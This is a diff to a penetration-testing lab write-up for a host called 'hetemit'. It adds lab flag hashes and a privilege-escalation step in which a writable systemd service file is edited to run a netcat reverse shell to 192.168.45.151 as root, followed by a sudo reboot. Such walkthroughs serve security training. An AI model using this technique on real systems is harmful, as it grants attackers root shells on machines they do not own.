@@ -8,8 +8,8 @@ cmeeks
 
 Main Objectives:
 
-Local.txt = 11c68cadc91e970541dca8e74ca80240
-Proof.txt = 
+Local.txt = 7a0ad2df28544b75524ee4f20ebe4f4d
+Proof.txt = a8b6164973f2fde7d11bfed46430b201
 
 **Enumeration**
 
@@ -1960,8 +1960,7 @@ User cmeeks may run the following commands on hetemit:
 You have write privileges over /etc/systemd/system/pythonapp.service 
 Interesting GROUP writable files (not in Home) (max 200)
 ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                                                   
-  Group cmeeks:                                                                                                                                                                                                    
-/etc/systemd/system/pythonapp.service   
+  Group cmeeks:                                                                                                                                                                                                                                                                                                                                                                             
 
 /home/cmeeks/.rvm/rubies/ruby-2.6.3/bin/ruby
 
@@ -1982,10 +1981,37 @@ Analyzing Jenkins Files (limit 70)
 
 1. PE Steps
 
-```
+- Write access on to /etc/systemd/system/pythonapp.service 
+- Edited /etc/systemd/system/pythonapp.service 
 
 ```
+[Unit]
+Description=Python App
+After=network-online.target
 
+[Service]
+Type=simple
+WorkingDirectory=/home/cmeeks/restjson_hetemit
+ExecStart=nc 192.168.45.151 445 -e /bin/bash
+TimeoutSec=30
+RestartSec=15s
+User=root
+ExecReload=/bin/kill -USR1 $MAINPID
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+```
+
+- Used sudo permission to reboot.
+
+```
+sudo reboot
+```
+
+- Setup listener using penelope and reeceived reverse shell.
+
+![[Pasted image 20260117192902.png]]
 2. Notes
 
 ```
